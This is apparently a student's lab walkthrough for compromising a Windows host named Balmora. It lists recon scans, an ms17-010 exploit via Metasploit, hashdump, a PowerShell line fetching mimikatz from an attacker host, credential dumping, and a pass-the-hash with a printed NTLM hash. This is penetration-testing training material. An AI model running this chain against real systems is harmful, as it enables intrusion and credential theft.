# Balmora - 192.168.2.10
## Andrea Zonnekus 18758119

nbtscan -r 192.168.2.0/24

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.001.png)

sudo nmap -sV -p- -O 192.168.2.10 -oN host -Pn --script="default or safe" --open![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.002.png)

gobuster dir -u 192.168.2.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o http\_enum -x aspx

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.003.png)



nmap -p 445 192.168.2.10 --script=smb-vuln\* -oN smb

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.004.png)

search ms17-010

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.005.png)

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.006.png)

hashdump

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.007.png)

(at this point you are local administrator)

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.0.106/mimi64.exe', 'mimikatz.exe')"

sekurlsa::logonpasswords

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.008.png)

sekurlsa::pth /user:Administrator /domain:MORROWIND-NORTH /ntlm:e04b23bbc2d621b8ac033605f4eac59c

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.009.png)

migrate 2932

![](balmora_steps/Aspose.Words.c852cd6a-5625-411a-9868-ca5e216c5421.010.png)

(at this time my connection fell)
